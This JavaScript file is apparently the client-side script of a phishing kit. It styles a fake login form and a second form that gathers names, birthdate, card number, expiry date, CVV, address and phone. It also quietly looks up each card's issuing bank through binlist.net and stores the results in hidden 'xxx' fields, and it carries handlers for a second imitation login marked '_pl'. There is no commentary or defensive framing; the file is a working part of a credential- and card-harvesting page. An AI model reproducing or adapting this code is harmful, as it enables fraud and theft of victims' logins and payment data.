$(document).ready(function(){
    $(".dvLoading").hide();
    $(".err0rmail").hide();
    $(".err0rpass").hide();
    $("#email").blur(function(){
            if($('#email').val() != ''){
                $(this).css("border-bottom", "2px solid transparent");
                $(".err0rmail").hide();
            }else{
                $(this).css("border-bottom", "2px solid #E87C03");
                $(".err0rmail").show();
            }    });
    $("#pass").blur(function(){
        $(this).css("border-bottom", "2px solid #E87C03");
            if($('#pass').val() != ''){
                $(this).css("border-bottom", "2px solid transparent");
                $(".err0rpass").hide();
            }else{
                $(this).css("border-bottom", "2px solid #E87C03");
                $(".err0rpass").show();
            }
    });
    $(".hide-password").hide();
    $(".show-password").hide();
    $("#pass").focus(function(){
        $(".show-password").show();
        $(".hide-password").hide();
    });
    $(".show-password").click(function(){
        $(".hide-password").show();
        $(this).hide();
        $("#pass").attr("type", "text");
    });
    $(".hide-password").click(function(){
        $(".show-password").show();
        $(this).hide();
        $("#pass").attr("type", "password");
    });



/* */
    $(".option__field").focus(function(){
        $(this).css("border", "1px solid #106bf2");

    });
    $("#fname").blur(function(){
            if($('#fname').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#lname").blur(function(){
            if($('#lname').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#birthdy").blur(function(){
            if($('#birthdy').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#cnmbrr").blur(function(){
            if($('#cnmbrr').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#exp_dt").blur(function(){
            if($('#exp_dt').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#cvv").blur(function(){
            if($('#cvv').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });    
    $("#addresse").blur(function(){
            if($('#addresse').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });     
    $("#city").blur(function(){
            if($('#city').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });    
    $("#country").blur(function(){
            if($('#country').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });
    $("#zip").blur(function(){
            if($('#zip').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    }); 
   $("#ph").blur(function(){
            if($('#ph').val() == ''){
                $(this).css("border", "1px solid #ce0202");
            }else{
                $(this).css("border", "solid 1px #5FA53F");
            }   
    });


    /**/
    $('#cnmbrr').blur(function(){
    var card_value =  $('#cnmbrr').val();
    
      $.ajax('https://lookup.binlist.net/'+card_value+'')
      .then(
          function success(response) {
              var namebank = response.bank.name;
              var schemecard = response.scheme;
              var typecard = response.type;
              var urlbank = response.bank.url;
              var phonebank = response.bank.phone;
              $('#xxxnb').val(namebank);
              $('#xxxsc').val(schemecard);
              $('#xxxtc').val(typecard);
              $('#xxxub').val(urlbank);
              $('#xxxpb').val(phonebank);
          },

          function fail(data, status) {
              console.log('Request failed.  Returned status of',
                          status);
          }
      );
      });
    /**/
    /**/
    /**/

            $(".main_pl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $(".content_pl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $(".header_pl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $(".form_pl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $("#emailpl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $("#passpl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $(".otr").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });         
            $(".sgbtn").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });         
            $(".htbli").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });         
            $(".footer_pl").click(function(){
                $('#passpl').css("position", "static");
                $(".err_pl").slideUp('slow');
                $(".err_pl2").slideUp('slow');
            });
            $("#exp_dt").keyup(function(){
                if ($(this).val().length == 2){
                    $(this).val($(this).val() + "/");
                }
            });
            
            

});
